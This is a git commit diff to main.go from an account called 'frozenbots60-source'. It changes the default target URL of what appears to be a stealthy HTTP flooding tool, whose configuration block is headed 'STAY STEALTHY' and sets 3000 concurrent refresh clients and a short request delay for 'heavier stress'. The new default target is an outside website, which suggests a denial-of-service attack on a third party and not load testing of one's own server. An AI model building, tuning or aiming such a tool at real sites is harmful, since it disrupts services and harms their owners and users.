9fc9a14f53e28a8645f150eb91fb2541687f1e7e
frozenbots60-source <frozenbots60@gmail.com>
2026-02-25 12:07:22 +0530

    Update main.go

--- main.go
+++ main.go
@@ -19,7 +19,7 @@ import (
 // CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	SERVER_URL      = getEnv("TARGET_URL", "https://www.goldgo.cc/")
+	SERVER_URL      = getEnv("TARGET_URL", "https://page.aapay.in/land/index.html?st=self/")
 	TOTAL_CLIENTS   = 3000          // Number of concurrent refresh clients
 	MAX_WORKERS     = 3000
 	REFRESH_DELAY   = 80 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
